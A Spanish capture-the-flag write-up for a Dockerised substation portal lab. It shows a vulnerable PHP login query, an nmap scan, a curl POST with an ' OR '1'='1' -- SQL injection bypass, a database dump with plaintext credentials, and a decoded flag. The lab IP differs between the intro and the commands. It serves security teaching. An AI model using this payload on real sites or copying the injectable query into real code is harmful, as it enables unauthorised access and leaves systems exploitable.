# Login del operador

> Portal de guardia de la subestación Norte. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh && ./startlab.sh blackout-web02.tar` → muestra la IP del lab (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. El portal pide identificación de guardia.

**Flag:** `WHOAMI{sql1_g3r3nt3_n0rt3}`

---

## Resolución

### 1. Levantar el lab con Docker

**Herramienta:** `docker inspect`. **Por qué:** obtengo la IP del contenedor recién arrancado.

```bash
$ unzip blackout-web02.zip
$ chmod +x startlab.sh && ./startlab.sh blackout-web02.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web02
172.17.0.2
```

### 2. Enumerar con nmap

**Herramienta:** `nmap`. **Por qué:** ver qué servicios hay antes de atacar.

**Parámetros:** `-sV` (versión), `-p-` (todos los puertos).

```bash
$ nmap -sV -p- 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Solo el puerto 80: un portal PHP (`X-Powered-By: PHP/8.2.33`) con secciones Inicio / Estado / Acceso guardia / Comunidad / Contacto.

### 3. Analizar el login

El formulario de `/login.php` pide `usuario` y `clave`. Un vistazo al código (dentro del contenedor) revela una consulta SQL mal construida:

```php
$sql = "SELECT ... FROM operadores WHERE usuario = '$usuario' AND clave = '$clave' LIMIT 1";
```

Las variables se interpilan directo en la cadena → **SQL injection**.

### 4. Autenticarse por SQLi

**Herramienta:** `curl`. **Por qué:** enviar el POST de login con el payload de inyección.

**Parámetros:** `-X POST` y `-d` (cuerpo del formulario), `-c cookies.txt` (guardar la sesión).

```bash
$ curl -s -X POST http://172.17.0.2/login.php \
    -d "usuario=admin' OR '1'='1' -- &clave=x" -c cookies.txt
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
Location: /turno.php
```

El `' OR '1'='1' -- ` anula el resto del WHERE y el `--` comenta la comparación de la clave. Con la cookie quedamos autenticados como el primer operador (`caja.turno`), pero su nota no es la flag.

### 5. Inspeccionar la base de datos

**Herramienta:** `sqlite3`. **Por qué:** la flag no está en el primer registro, así que se revisa la base entera.

Revisando el SQLite dentro del contenedor aparecen los tres operadores:

```bash
$ sqlite3 /var/lib/latam/guardia.db "SELECT * FROM operadores;"
1|caja.turno|CajaNorte14|caja|Cierre de caja sector 14. Sin novedad.
2|operador.norte|TurnoNorte26|operador|Relé SCADA en alerta. Esperando sync.
3|gerente.norte|N0rt3-G3r3nc14!|gerente|V0hPQU1Je3NxbDFfZzNyM250M19uMHJ0M30=
```

La nota del **gerente** es base64:

```bash
$ echo "V0hPQU1Je3NxbDFfZzNyM250M19uMHJ0M30=" | base64 -d
WHOAMI{sql1_g3r3nt3_n0rt3}
```

## Lección

Los formularios de login con intercalación directa de variables en SQL son un blanco clásico de inyección. La SQLi (`' OR '1'='1' --`) permite entrar sin credenciales, y a veces la flag vive en otra fila/tabla de la base — conviene inspeccionarla entera, no solo la primera coincidencia.